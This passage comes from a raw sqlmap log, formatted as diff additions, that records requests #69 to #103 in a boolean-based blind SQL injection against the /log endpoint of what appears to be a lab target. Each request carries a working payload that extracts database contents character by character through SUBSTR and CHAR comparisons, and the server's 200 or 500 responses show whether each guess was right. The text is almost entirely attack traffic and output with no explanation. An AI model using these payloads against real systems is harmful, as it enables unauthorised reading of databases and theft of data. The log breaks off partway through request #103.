+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(67))||'"}
+
+HTTP response [#69] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:23 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#70]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(57))||'"}
+
+HTTP response [#70] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:23 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#71]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(52))||'"}
+
+HTTP response [#71] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:23 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#72]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(49))||'"}
+
+HTTP response [#72] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:24 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#73]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(50))||'"}
+
+HTTP response [#73] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:24 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#74]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),15,1)>CHAR(51))||'"}
+
+HTTP response [#74] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:24 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#75]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(47))||'"}
+
+HTTP response [#75] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:25 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#76]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(87))||'"}
+
+HTTP response [#76] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:25 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#77]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(67))||'"}
+
+HTTP response [#77] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:26 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#78]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(57))||'"}
+
+HTTP response [#78] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:26 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#79]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(52))||'"}
+
+HTTP response [#79] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:26 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#80]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(54))||'"}
+
+HTTP response [#80] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:27 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#81]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(55))||'"}
+
+HTTP response [#81] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:27 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#82]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),16,1)>CHAR(56))||'"}
+
+HTTP response [#82] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:28 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#83]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),17,1)>CHAR(47))||'"}
+
+HTTP response [#83] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:28 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#84]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),17,1)>CHAR(87))||'"}
+
+HTTP response [#84] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:29 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#85]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),17,1)>CHAR(67))||'"}
+
+HTTP response [#85] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:29 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#86]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),17,1)>CHAR(57))||'"}
+
+HTTP response [#86] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:29 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#87]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),17,1)>CHAR(52))||'"}
+
+HTTP response [#87] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:30 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#88]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),17,1)>CHAR(54))||'"}
+
+HTTP response [#88] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:30 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#89]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),17,1)>CHAR(53))||'"}
+
+HTTP response [#89] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:30 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#90]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),18,1)>CHAR(47))||'"}
+
+HTTP response [#90] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:31 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#91]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),18,1)>CHAR(87))||'"}
+
+HTTP response [#91] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:31 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#92]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),18,1)>CHAR(107))||'"}
+
+HTTP response [#92] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:32 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#93]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),18,1)>CHAR(97))||'"}
+
+HTTP response [#93] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:32 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#94]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),18,1)>CHAR(102))||'"}
+
+HTTP response [#94] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:33 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#95]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),18,1)>CHAR(99))||'"}
+
+HTTP response [#95] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:33 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#96]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),18,1)>CHAR(98))||'"}
+
+HTTP response [#96] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:33 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#97]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),19,1)>CHAR(96))||'"}
+
+HTTP response [#97] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:34 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#98]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),19,1)>CHAR(112))||'"}
+
+HTTP response [#98] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:34 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#99]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),19,1)>CHAR(104))||'"}
+
+HTTP response [#99] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:34 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#100]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),19,1)>CHAR(100))||'"}
+
+HTTP response [#100] (200 OK):
+Content-Length: 17
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:35 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"success":true}
+
+
+############################################################################
+
+HTTP request [#101]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),19,1)>CHAR(102))||'"}
+
+HTTP response [#101] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:35 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#102]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 166
+Connection: close
+
+{"message":"test'||(SELECT CHAR(80,82,102,75) WHERE 1290=1290 AND SUBSTR((SELECT COALESCE(CAST(message AS TEXT),CHAR(32)) FROM `logs` LIMIT 8,1),19,1)>CHAR(101))||'"}
+
+HTTP response [#102] (500 Internal Server Error):
+Content-Length: 69
+Content-Type: application/json
+Date: Sat, 06 Dec 2025 13:20:35 GMT
+Server: Werkzeug/2.2.2 Python/3.11.2
+Connection: close
+URI: http://cc4153e12669.target.yijinglab.com/log
+
+{"error":"NOT NULL constraint failed: logs.message","success":false}
+
+
+############################################################################
+
+HTTP request [#103]:
+POST /log HTTP/1.1
+Content-Type: application/json
+User-Agent: sqlmap/1.9.8#stable (https://sqlmap.org)
+Referer: http://cc4153e12669.target.yijinglab.com/log
+Host: cc4153e12669.target.yijinglab.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-length: 165
+Connection: close
+
